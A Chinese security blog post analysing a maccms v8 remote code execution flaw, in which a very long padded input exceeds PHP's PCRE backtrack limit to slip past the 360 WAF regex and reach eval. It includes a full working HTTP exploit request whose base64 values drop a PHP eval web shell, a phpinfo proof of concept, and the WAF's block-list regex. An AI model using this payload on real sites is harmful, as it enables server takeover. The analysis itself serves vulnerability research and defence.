\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[www.cnpanda.net\](https://www.cnpanda.net/codeaudit/660.html)

0x01 写在前面
---------

偶然间看到了这个漏洞，利用 80w 长度的垃圾字符填充，使正则回溯次数超过一定限度，导致绕过了 360 模块的防御，本文主要介绍了正则回溯以及 maccms v8 80w 字符 RCE 的详细分析。

0x02 正则回溯
---------

### 1、正则引擎

“正则回溯”中的 “正则” 我们都很熟悉，但是什么是回溯呢？

说回溯前，要先谈一谈正则表达式的引擎，正则引擎主要可以分为基本不同的两大类：一种是 DFA（确定型有穷自动机），另一种是 NFA（不确定型有穷自动机），NFA 对应的是**正则表达式**主导的匹配，而 DFA 对应的是**文本主导**的匹配。

目前使用 DFA 引擎的程序主要有：`awk`,`egrep`,`flex`,`lex`,`MySQL`,`Procmail`等；  
使用传统型 NFA 引擎的程序主要有：`GNU Emacs`,`Java`,`ergp`,`less`,`more`,`.NET`,`,PCRE library`,`Perl`,`PHP`,`Python`,`Ruby`,`sed`,`vi`；

DFA 在**线性时**状态下执行，不要求回溯，并且其从匹配文本入手，从左到右，每个字符不会匹配两次，所以通常情况下，它的速度更快，但支持的特性很少，不支持捕获组、各种引用。

NFA 则是从正则表达式入手，并且不断读入字符，尝试是否匹配当前正则，不匹配则吐出字符重新尝试，在最坏情况下，它的执行速度可能非常慢，但 NFA 支持更多的特性，因而绝大多数编程场景下，比如 PHP、Java，python 等，使用的都是 NFA。

对于 DFA 举例如下：

引擎在扫码当前文本的时候，会记录当前有效的所有匹配可能。当引擎移动到文本的 t 时，它会在当前处理的匹配可能中添加一个潜在的可能：

![](https://www.cnpanda.net/usr/uploads/2019/12/2967024784.png)

接下来扫描的每个字符，都会更新当前的可能匹配序列。例如扫码到匹配文本的 J 时，有效的可能匹配变成了 2 个，Rose 被淘汰出局。

![](https://www.cnpanda.net/usr/uploads/2019/12/3335406379.png)

扫描到匹配文本的 e 时，Jack 也被淘汰出局，此时就只剩一个可能的匹配了。当完成后续的 rry 的匹配时，整个匹配完成。

![](https://www.cnpanda.net/usr/uploads/2019/12/3655422429.png)

对于 NFA 举例如下：

在解析器眼中 DEF 有四个数字位置，如下图：

![](https://www.cnpanda.net/usr/uploads/2019/12/258911108.png)

对于正则表达式而言所有源字符串，都有字符和位置，且正则表达式会从 0 号位置逐个去匹配。

我们令匹配成功为 “取得控制权”；

当正则为`DEF`时，过程如下：

首先由正则表达式字符 `D` 取得控制权，从位置`0`开始匹配，由`D` 来匹配`D`，匹配成功，控制权交给字符 `E` ；由于`D`已被 `D` 匹配，所以 `E` 从位置`1`开始尝试匹配，由`E` 来匹配`E`，匹配成功，控制权交给 `F`；由`F`来匹配`F`，匹配成功。

当正则为`/D\w+F/`时，过程如下：

首先由正则表达式字符`/D/` 取得控制权，从位置`0`开始匹配，由 `/D/` 来匹配`D`，匹配成功，控制权交给字符`/\w+/` ；由于`D`已被`/D/`匹配，所以 `/\w+/` 从位置`1`开始尝试匹配，`\w+`贪婪模式，会记录一个备选状态，默认会匹配最长字符，直接匹配到`EF`，并且匹配成功，当前位置为`3`。并且把控制权交给 `/F/` ；由 `/F/` 匹配失败，`\w+`匹配会回溯一位，当前位置变成`2`。并把控制权交给`/F/`，由`/F/`匹配字符 F 成功。

由上面可以知道，对于 DFA 而言，不管正则表达式怎么样，文本的匹配过程是一致的，都是对文本的字符依次从左到右进行匹配，NFA 对于不同但效果相同的正则表达式，匹配过程是完全不同的。

### 2、回溯

回到正题，现在来谈回溯。

假设字符串及其位置如下：

![](https://www.cnpanda.net/usr/uploads/2019/12/844844615.png)

与上文相同，令匹配成功为 “取得控制权”，如果正则表达式为：`/.*?b/`

那么匹配过程如下：`.*?`首先取得控制权, 假设该匹配为非贪婪模式, 所以优先不匹配, 将控制权交给下一个匹配字符`b`， `b`在源字符串位置 1 匹配失败`a`, 于是回溯, 将控制权交回给`.*?`，这个时候, `.*?`匹配一个字符`a`，并再次将控制权交给`b`，这样一个过程，被称之为**回溯**， 如此反复，最终得到匹配结果， 这个过程中一共发生了 3 次回溯。

### 3、正则回溯

在 PHP 的 pcre 扩展中，配置选项如下表所示：

<table><thead><tr><th>名字</th><th>默认</th><th>可修改范围</th><th>更新日志</th></tr></thead><tbody><tr><td><a href="https://www.php.net/manual/zh/pcre.configuration.php#ini.pcre.backtrack-limit">pcre.backtrack_limit</a></td><td>"100000"</td><td>PHP_INI_ALL</td><td>php 5.2.0 起可用。</td></tr><tr><td><a href="https://www.php.net/manual/zh/pcre.configuration.php#ini.pcre.recursion-limit">pcre.recursion_limit</a></td><td>"100000"</td><td>PHP_INI_ALL</td><td>php 5.2.0 起可用。</td></tr><tr><td><a href="https://www.php.net/manual/zh/pcre.configuration.php#ini.pcre.jit">pcre.jit</a></td><td>"1"</td><td>PHP_INI_ALL</td><td>PHP 7.0.0 起可用</td></tr></tbody></table>

*   pcre.backtrack\_limit：PCRE 的最大回溯数限制
*   pcre.recursion\_limit：PCRE 的最大递归数限制

如上表所示，默认的`backtarck_limit`是 100000。

我们定义一个正则：`/UNION.+?SELECT/is`

同时要检测的文本如下：`UNION/*panda*/SELECT`

流程大致如下，

*   首先匹配到`UNION`
*   `.+?`匹配到`/`
*   非贪婪模式，`.+?`停止向后匹配，由`S`匹配`*`
*   `S`匹配`*`失败，**第一次回溯**，再由`.+?`匹配`*`
*   非贪婪模式，`.+?`停止向后匹配，再由`S`匹配`p`
*   `S`匹配`p`失败，**第二次回溯**，再由`.+?`匹配`p`
*   非贪婪模式，`.+?`停止向后匹配，再由`S`匹配`a`
*   `S`匹配`a`失败，**第三次回溯**，再由`.+?`匹配`a`
*   非贪婪模式，`.+?`停止向后匹配，再由`S`匹配`n`
*   `S`匹配`n`失败，**第四次回溯**，再由`.+?`匹配`n`
*   非贪婪模式，`.+?`停止向后匹配，再由`S`匹配`d`
*   `S`匹配`d`失败，**第五次回溯**，再由`.+?`匹配`a`
*   非贪婪模式，`.+?`停止向后匹配，再由`S`匹配`S`
*   `S`匹配`S`匹配成功，继续向后，直至`SELECT`匹配`SELECT`成功

从上面可以看出，回溯的次数是我们可以控制的，当我们在`/**/`之间写入的内容越多，那么回溯的次数也就越多，假定我们传入的字符串很多，导致回溯次数超过了`pcre.backtrack_limit`的限制，那么就可能绕过这个正则表达式，从而导致绕过 waf 之类的限制。

这个问题其实在 2007 年的时候就有人向官网提出过：

![](https://www.cnpanda.net/usr/uploads/2019/12/3383581821.png)

但官网采取的整改如下：

![](https://www.cnpanda.net/usr/uploads/2019/12/405841951.png)

其实 python 中也存在着 “limit”，但是官网解释如下：

![](https://www.cnpanda.net/usr/uploads/2019/12/739052981.png)

可能没有足够的内存来构造那么大的字符串 —— so ~

0x03 maccms v8 80w 字符 RCE
-------------------------

根据漏洞的 payload ：

```
POST /index.php?m=vod-search HTTP/1.1
Host: xxx.xxx.xxx.xx
Content-Length: 500137
Cache-Control: max-age=0
Origin: xxx.xxx.xxx
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3
Referer: xxx.xxx.xxx.xx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: Hm\_lvt\_ff7f6fcad4e6116760e7b632f9614dc2=1574418087,1574670614,1574673402,1575271439; Hm\_lvt\_137ae1af30761db81edff2e16f0bf0f8=1574418087,1574670615,1574673402,1575275889; pgv\_pvi=8322096128; PHPSESSID=pr37r8fkshd854f8fnfep4ov53; adminid=1; adminname=admin; adminlevels=b%2Cc%2Cd%2Ce%2Cf%2Cg%2Ch%2Ci%2Cj; admincheck=2afdbd385cb6c2af162e6733f1b0e2d2
Connection: close

wd=union(80w个a){if-A:print(fputs%28fopen%28base64\_decode%28Yy5waHA%29,w%29,base64\_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29)}{endif-A}

```

进入 `index.php`查看相关参数：

```
$acs = array('vod','art','map','user','gbook','comment','label');

if(in\_array($ac,$acs)){
        $tpl->P\['module'\] = $ac;
        include MAC\_ROOT.'/inc/module/'.$ac.'.php';
    }
    else{
        showErr('System','未找到指定系统模块');
    }
    unset($par);
    unset($acs);
    $tpl->ifex();

```

确定漏洞文件在`/inc/module/vod.php`中的 search 模块，其核心内容如下：

```
elseif($method=='search')
{
    $tpl->C\["siteaid"\] = 15;
    $wd = trim(be("all", "wd")); 
    $wd = chkSql($wd);
    if(!empty($wd)){ 
    $tpl->P\["wd"\] = $wd; 
  }
  
  .....
    
  $tpl->H = loadFile(MAC\_ROOT\_TEMPLATE."/vod\_search.html");
    $tpl->mark();
    $tpl->pageshow();
    

```

be 函数主要内容如下：

```
function be($mode,$key,$sp=',')
{
    ini\_set("magic\_quotes\_runtime", 0);
    $magicq= get\_magic\_quotes\_gpc();
    switch($mode)
    {
        case 'post':
            $res=isset($\_POST\[$key\]) ? $magicq?$\_POST\[$key\]:@addslashes($\_POST\[$key\]) : '';
            break;
        case 'get':
            $res=isset($\_GET\[$key\]) ? $magicq?$\_GET\[$key\]:@addslashes($\_GET\[$key\]) : '';
            break;
        case 'arr':
            $arr =isset($\_POST\[$key\]) ? $\_POST\[$key\] : '';
            if($arr==""){
                $value="0";
            }
            else{
                for($i=0;$i<count($arr);$i++){
                    $res=implode($sp,$arr);
                } 
            }
            break;
        default:
            $res=isset($\_REQUEST\[$key\]) ? $magicq ? $\_REQUEST\[$key\] : @addslashes($\_REQUEST\[$key\]) : '';
            break;
    }
    return $res;
}

```

主要是对 GET，POST，REQUEST 接收到的参数进行 addslashes 的转义处理，回到`vod.php`页面，在经过 Be 函数处理后，再进行字符串两侧空白字符移除处理，最终传入 `chkSql()`进行 360 waf 的 SQL 检测模块，其函数主要内容如下：

```
function chkSql($s)
{
    global $getfilter,$postfilter;
    if(empty($s)){
        return "";
    }
    $s = htmlspecialchars(urldecode(trim($s))); 
    StopAttack(1,$s,$getfilter);
  StopAttack(1,$s,$postfilter);
    return $s;
}

```

将 urldecode 解码后的一些预定义的字符转换为 HTML 实体，再传入`StopAttack()`函数，该函数主要内容如下：

```
  function chkShow()
{
    $errmsg = "<div style=\\"position:fixed;top:0px;width:100%;height:100%;background-color:white;color:green;font-weight:bold;border-bottom:5px solid #999;\\"><br>您的提交带有不合法参数,谢谢合作!<br>操作IP: ".$\_SERVER\["REMOTE\_ADDR"\]."<br>操作时间: ".strftime("%Y-%m-%d %H:%M:%S")."<br>操作页面:".$\_SERVER\["PHP\_SELF"\]."<br>提交方式: ".$\_SERVER\["REQUEST\_METHOD"\]."</div>";
    print $errmsg;
    exit();
}
function StopAttack($StrFiltKey,$StrFiltValue,$ArrFiltReq)
{

 $StrFiltValue=arr\_foreach($StrFiltValue);
 $StrFiltValue=urldecode($StrFiltValue);
 
 if(preg\_match("/".$ArrFiltReq."/is",$StrFiltValue)==1){
        chkShow();
 }
 if(preg\_match("/".$ArrFiltReq."/is",$StrFiltKey)==1){
        chkShow();
 }
}

```

对传入进的字符，进行正则匹配，正则如下：

```
<.\*=(&#\\\\d+?;?)+?>|<.\*data=data:text\\\\/html.\*>|\\\\b(alert\\\\(|be\\\\(|eval\\\\(|confirm\\\\(|expression\\\\(|prompt\\\\(|benchmark\\s\*?\\(.\*\\)|sleep\\s\*?\\(.\*\\)|load\_file\\s\*?\\\\()|<\[^>\]\*?\\\\b(onerror|onmousemove|onload|onclick|onmouseover|eval)\\\\b|\\\\b(and|or)\\\\b\\\\s\*?(\[\\\\(\\\\)'\\"\\\\d\]+?=\[\\\\(\\\\)'\\"\\\\d\]+?|\[\\\\(\\\\)'\\"a-zA-Z\]+?=\[\\\\(\\\\)'\\"a-zA-Z\]+?|>|<|\\s+?\[\\\\w\]+?\\\\s+?\\\\bin\\\\b\\\\s\*?\\(|\\\\blike\\\\b\\\\s+?\[\\"'\])|\\\\/\\\\\*.\*\\\\\*\\\\/|<\\\\s\*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT(\\\\(.+\\\\)|\\\\s+?.+?)|UPDATE(\\\\(.+\\\\)|\\\\s+?.+?)SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE)(\\\\(.+\\\\)|\\\\s+?.+?\\\\s+?)FROM(\\\\(.+\\\\)|\\\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)|UNION(\[\\s\\S\]\*?)SELECT|SELECT|UPDATE|\_get|\_post|\_request|\_cookie|\_server|eval|assert|fputs|fopen|global|chr|strtr|pack|system|gzuncompress|shell\_|base64\_|file\_|proc\_|preg\_|call\_|ini\_|php|\\\\{|\\\\}|\\\\(|\\\\\\|\\\\)

```

主要问题在这一句：

```
UNION(\[\\s\\S\]\*?)SELECT

```

`([\s\S]*?)`——匹配所有字符，且只匹配一次

但是这句话中开起来非贪婪模式，导致这段正则不断回溯，如我定义一个文本为：`UNION(panda)SELECT`

其匹配过程大致如下：

*   首先匹配到`UNION`
*   进入子表达式检测，`[\s\S]*?`，匹配所有字符
*   懒惰模式，`*?`停止向后匹配，所以直接由`S`匹配`（`
*   `S`匹配`（`失败，**第一次回溯**，再由`*?`匹配`p`
*   懒惰模式，`*?`停止向后匹配，再由`S`匹配`a`
*   `S`匹配`a`，**第二次回溯**，再由`*?`匹配`a`
*   懒惰模式，`*?`停止向后匹配，再由`S`匹配`n`
*   ... （以此类推）
*   最终由`S`匹配到`S`后，结束回溯

该过程动画如下：

![](https://www.cnpanda.net/usr/uploads/2019/12/maccms-rce.gif)

所以在这里，我们就可以利用最大匹配的次数，来绕过`preg_match("/".$ArrFiltReq."/is",$StrFiltValue)==1`的判断，因为超过最大匹配次数后，其返回的结果并不为 1，而是`false`。

这样一来，我们就绕过了 360 waf 防御模块的 `chkSql()`函数检测，也就是说目前这个 wd 参数我们是可控的。

回到`index.php`页面，发现加载完模块后，进入了`$tpl->ifex();`函数，跟进发现其核心代码如下：

```
function ifex()
    {
        if (!strpos(",".$this->H,"{if-")) { return; }
        $labelRule = buildregx('{if-(\[\\s\\S\]\*?):(\[\\s\\S\]+?)}(\[\\s\\S\]\*?){endif-\\1}',"is");
        preg\_match\_all($labelRule,$this->H,$iar);
        
  ...
    
    try{
            if (strpos(",".$strThen,$labelRule2)>0){
        ...
     $ee = @eval("if($strif){\\$resultStr='$elseifArray\[0\]';\\$elseifFlag=true;}");
        if(!$elseifFlag){
           ...
           @eval("if($strElseif){\\$resultStr='$strElseifThen'; \\$elseifFlag=true;}");
                     ...
        if(!$elseifFlag){
           ...
           @eval("if($strElseif0){\\$resultStr='$strElseifThen0';\\$elseifFlag=true;}");
           ...
      else{
                $ifFlag = false;
                if (strpos(",".$strThen,$labelRule3)>0){
          ...
            @eval("if($strif){\\$ifFlag=true;}else{\\$ifFlag=false;}");
          ...
        else{
                    @eval("if($strif){\\$ifFlag=true;}else{\\$ifFlag=false;}");
          if ($ifFlag){ $this->H=str\_replace($iar\[0\]\[$m\],$strThen,$this->H);} else { $this->H=str\_replace($iar\[0\]\[$m\],"",$this->H); }

          ...
        }
         ...
          

```

该函数首先对`$this->H`进行了判断，是否含有`{if-`，而`$this->H`在`vod.php`已经定义如下：

```
$tpl->H = loadFile(MAC\_ROOT\_TEMPLATE."/vod\_search.html");

```

该模板的应用内容在`inc/common/template.php` 中控制，跟踪发现即是 wd 参数控制。

回到`template.php`的`ifex()`函数，发现

```
preg\_match\_all($labelRule,$this->H,$iar);

```

该正则的主要作用是匹配出提取出来的 wd 参数，然后后面就是一系列的循环和判断，最终执行了 eval。

由于限制最少，所以我们选择最后一个 eval 去执行，要执行前，需要满足的条件如下：

*   `$this-H`中必须有`{if-` ----> wd 参数中带有`{if-`即可
*   满足正则：`{if-([\s\S]*?):([\s\S]+?)}([\s\S]*?){endif-\1}`
*   不满足 if 判断：`strpos(",".$strThen,$labelRule2)>0`
*   不满足 If 判断：`strpos(",".$strThen,$labelRule3)>0`

这样一来就可以进入我们想要的 eval 执行语句：

```
eval("if($strif){\\$ifFlag=true;}else{\\$ifFlag=false;}");

```

综上，payload 如下即可满足：

```
{if-A:phpinfo()}{endif-A}

```

0x04 漏洞复现
---------

如上所述，完整的利用链已经形成了。

首先通过正则回溯来绕过 360 waf，然后通过可控参数 wd 传入我们的 payload，payload 传入`$this-H`，然后绕过判断传入 eval 中执行。

如下图，如果我们不采用正则回溯的方法，那么会被拦截：

![](https://www.cnpanda.net/usr/uploads/2019/12/2720093776.png)

采用正则回溯，则会绕过 360waf：

![](https://www.cnpanda.net/usr/uploads/2019/12/2238219254.png)

由于环境的问题，我这里测试 80W 字符不够，800W 也不够，于是设置了 1000W，成功绕过。

由于环境的问题，我这里测试 80W 字符不够，800W 也不够，于是设置了 1000W，成功绕过。

测试的时候，在 PHP 7.0 的版本下可能会出现以下问题，导致不能利用此漏洞：

![](https://xzfile.aliyuncs.com/media/upload/picture/20191231130023-7379cf92-2b8a-1.png)

或者

![](https://xzfile.aliyuncs.com/media/upload/picture/20191231130035-7ac6bab2-2b8a-1.png)

另外这个漏洞只能是非默认模板才可以，如下：

![](https://xzfile.aliyuncs.com/media/upload/picture/20200108154555-e6e9949c-31ea-1.png)

默认模板执行到这里直接退出了，不会再往下执行到 eval

0x05 参考
-------

[https://www.php.net/pcre/](https://www.php.net/pcre/)

[https://www.php.net/manual/zh/pcre.configuration.php](https://www.php.net/manual/zh/pcre.configuration.php)

[http://www.laruence.com/2010/06/08/1579.html](http://www.laruence.com/2010/06/08/1579.html)

[https://www.jqhtml.com/45531.html](https://www.jqhtml.com/45531.html)

[https://blog.csdn.net/iteye\_18591/article/details/82204352](https://blog.csdn.net/iteye_18591/article/details/82204352)

[https://www.cnblogs.com/test404/p/7397755.html](https://www.cnblogs.com/test404/p/7397755.html)

[https://www.cnblogs.com/Chary/p/No0000100.html](https://www.cnblogs.com/Chary/p/No0000100.html)

[https://www.t00ls.net/viewthread.php?tid=54216](https://www.t00ls.net/viewthread.php?tid=54216)

[https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)

使用微信扫描二维码完成支付

![](https://www.cnpanda.net/usr/themes/sec/img/alipay-2.jpg)